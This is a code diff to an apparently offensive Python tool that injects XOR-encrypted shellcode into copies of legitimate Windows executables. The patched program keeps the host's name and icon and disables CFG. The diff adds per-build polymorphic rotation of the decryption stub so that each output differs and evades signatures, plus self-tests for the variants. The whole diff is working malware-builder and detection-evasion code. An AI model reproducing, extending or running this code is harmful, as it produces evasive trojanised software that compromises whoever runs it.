@@ -302,7 +302,7 @@ PE_STUB_TEMPLATE_X86 = bytes.fromhex(
 
 
 def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int,
-                   arch: str = "x64") -> bytes:
+                   arch: str = "x64", variant: int = -1) -> bytes:
     """Entry stub for the .entp section (x64 or x86): decrypt the appended
     stage in place (rolling XOR, 16-byte key), resolve CreateThread via
     PEB -> Ldr -> kernel32 export-table walk, launch the decrypted shellcode
@@ -334,6 +334,8 @@ def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int,
     import struct as st
     if arch == "x86":
         code = bytearray(PE_STUB_TEMPLATE_X86)
+        variant = _pick_stub_variant(variant, "x86")
+        _apply_stub_variant(code, "x86", variant)
         # slot guards: the bytes before each immediate are the owning opcode
         assert code[12:14] == b"\x8d\x83", "stage-start lea opcode moved"
         assert code[18:20] == b"\x8d\xb3", "key lea opcode moved"
@@ -350,6 +352,8 @@ def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int,
         st.pack_into("<i", code, 317, oep - (sec_rva + exec_off + 321))
         return bytes(code)
     code = bytearray(PE_STUB_TEMPLATE)
+    variant = _pick_stub_variant(variant, "x64")
+    _apply_stub_variant(code, "x64", variant)
     assert code[18:21] == b"\x48\x8d\x83", "stage-start lea opcode moved"
     assert code[25:28] == b"\x4c\x8d\x83", "key lea opcode moved"
     assert code[55:58] == b"\x48\x81\xf9", "enc_len cmp opcode moved"
@@ -362,7 +366,8 @@ def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int,
     st.pack_into("<i", code, 260, oep - (sec_rva + exec_off + 264))
     return bytes(code)
 
-def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
+def patch_pe(host: bytes, sc: bytes, key: bytes,
+             stub_variant: int = -1) -> bytes:
     """Backdoor a copy of host: append a .entp section holding the XOR-encrypted
     shellcode + key + entry stub, and repoint the entry to the stub. The result
     IS the host program (same name, icon, version info) — it runs normally and
@@ -419,7 +424,8 @@ def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
     # 16-align the stub so its RVA can double as a CFG table entry (the low
     # bits of GuardCFFunctionTable entries are flags, not address bits).
     exec_off = (len(enc) + len(key) + 15) // 16 * 16
-    stub = _build_pe_stub(len(enc), exec_off, sec_rva, oep, arch)
+    stub = _build_pe_stub(len(enc), exec_off, sec_rva, oep, arch,
+                          variant=stub_variant)
     stub_rva = sec_rva + exec_off
 
     def rva_to_off(rva):
@@ -498,6 +504,62 @@ def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
         st.pack_into("<H", out, dllchar_off,
                      dllchar & ~0x4000)     # drop GUARD_CF: no CFG bitmap, no entry/thread checks
     return bytes(out)
+
+
+# ---------------------------------------------------------------------------
+# Stub variant rotation — every build emits a structurally different but
+# semantically identical decrypt loop. Equivalence comes from commutative
+# base/index swaps in the SIB byte ([rax+rcx*1] == [rcx+rax*1]) and the two
+# MR/RM opcode forms of mov (41 89 c9 == 44 8b c9): identical instruction
+# lengths, identical slot offsets, identical first-8 signature — so the
+# detonator/split-key locators and the emitted PowerShell arming scripts are
+# untouched. 8 x64 variants, 16 x86 variants, chosen at random per build.
+# ---------------------------------------------------------------------------
+
+# Each variant axis is a group of (offset, original bytes, replacement bytes).
+# Bit n of the variant index enables axis n. Applied after template load and
+# before slot patching; every group is length-preserving by construction.
+STUB_VARIANT_PATCHES = {
+    "x64": (
+        # bit 0: swap stage base/index in the load and store SIBs
+        ((37, b"\x08", b"\x01"), (51, b"\x08", b"\x01")),
+        # bit 1: swap base/index in the key-lookup SIB ([r8+r9] <-> [r9+r8])
+        ((48, b"\x08", b"\x01"),),
+        # bit 2: mov r9d,ecx MR form -> RM form (41 89 c9 -> 44 8b c9)
+        ((38, b"\x41\x89\xc9", b"\x44\x8b\xc9"),),
+    ),
+    "x86": (
+        # bit 0: swap stage load SIB ([eax+ecx] <-> [ecx+eax])
+        ((28, b"\x08", b"\x01"),),
+        # bit 1: swap key SIB ([esi+edi] <-> [edi+esi])
+        ((36, b"\x3e", b"\x37"),),
+        # bit 2: swap stage store SIB
+        ((39, b"\x08", b"\x01"),),
+        # bit 3: mov edi,ecx MR form -> RM form (89 cf -> 8b f9)
+        ((29, b"\x89\xcf", b"\x8b\xf9"),),
+    ),
+}
+STUB_VARIANT_COUNT = {a: 1 << len(p) for a, p in STUB_VARIANT_PATCHES.items()}
+
+
+def _apply_stub_variant(code: bytearray, arch: str, variant: int) -> bytearray:
+    """Apply variant axis groups to a freshly-copied stub template."""
+    for bit, group in enumerate(STUB_VARIANT_PATCHES[arch]):
+        if not (variant >> bit) & 1:
+            continue
+        for off, orig, new in group:
+            if bytes(code[off:off + len(orig)]) != orig:
+                raise EntrypointError(
+                    "stub template drifted — variant patch refused "
+                    f"({arch} bit {bit} @ {off})")
+            code[off:off + len(orig)] = new
+    return code
+
+
+def _pick_stub_variant(variant: int, arch: str) -> int:
+    """variant < 0 = random rotation; otherwise clamp into range."""
+    count = STUB_VARIANT_COUNT[arch]
+    return secrets.randbelow(count) if variant < 0 else (variant % count)
 
 
 def log_line(tag: str, msg: str) -> str:
@@ -1353,11 +1415,15 @@ class Entrypoint:
         if cfg.get("enc", enc) != enc:
             self.log(f"[!] PE embedding uses in-stub XOR (stronger ciphers need a full "
                      f"loader) — building with XOR Dynamic instead of {cfg.get('enc')}")
+        machine_rva = struct.unpack_from("<I", host, 0x3C)[0]
+        host_arch = ("x64" if struct.unpack_from("<H", host, machine_rva + 4)[0]
+                     == 0x8664 else "x86")
+        stub_variant = secrets.randbelow(STUB_VARIANT_COUNT[host_arch])
         key = rnd_bytes(16)
         self.log(f"[*] Encrypting with XOR Dynamic (key {key.hex()[:12]}...)")
         self.log(f"[*] Patching payload into host PE (T1055.002 file embedding)")
         try:
-            patched = patch_pe(host, shellcode, key)
+            patched = patch_pe(host, shellcode, key, stub_variant)
         except EntrypointError as e:
             self.log(f"[!] {e}")
             raise
@@ -1392,6 +1458,7 @@ class Entrypoint:
             "patched_len": len(patched), "host_len": len(host),
             "mitre": ["T1055.002", "T1027"],
             "key_hex": key.hex(),
+            "stub_variant": stub_variant,
             "split_delivery": bool(cfg.get("split_delivery")),
             "note": f"entry -> .entp stub ({host_arch}): decrypt, CreateThread(shellcode), jmp OEP",
         }
@@ -2617,6 +2684,32 @@ def _selftest():
     checks += 1
     if not _splitkey_roundtrip():
         fails.append("split-key: zero/arm round-trip")
+
+    # 5d. stub variant rotation: variants touch ONLY their declared byte
+    # ranges, slot patching still lands, lengths and signature unchanged
+    for v_arch, v_expect in (("x64", 8), ("x86", 16)):
+        checks += 1
+        v_ok = STUB_VARIANT_COUNT[v_arch] == v_expect
+        v_base = (PE_STUB_TEMPLATE if v_arch == "x64"
+                  else PE_STUB_TEMPLATE_X86)
+        for v in range(STUB_VARIANT_COUNT[v_arch]):
+            stub_v = _build_pe_stub(0x1234, 0x40, 0x3000, 0x1400,
+                                    v_arch, v)
+            stub_0 = _build_pe_stub(0x1234, 0x40, 0x3000, 0x1400,
+                                    v_arch, 0)
+            if len(stub_v) != len(v_base) or stub_v[:8] != v_base[:8]:
+                v_ok = False
+            diff = {i for i in range(len(stub_v))
+                    if stub_v[i] != stub_0[i]}
+            allowed = set()
+            for bit, group in enumerate(STUB_VARIANT_PATCHES[v_arch]):
+                if (v >> bit) & 1:
+                    for off, orig, new in group:
+                        allowed.update(range(off, off + len(orig)))
+            if not diff <= allowed:
+                v_ok = False
+        if not v_ok:
+            fails.append(f"variant: {v_arch} equivalence broke")
 
     print(f"selftest: {checks} checks, {len(fails)} failures")
     for x in fails:
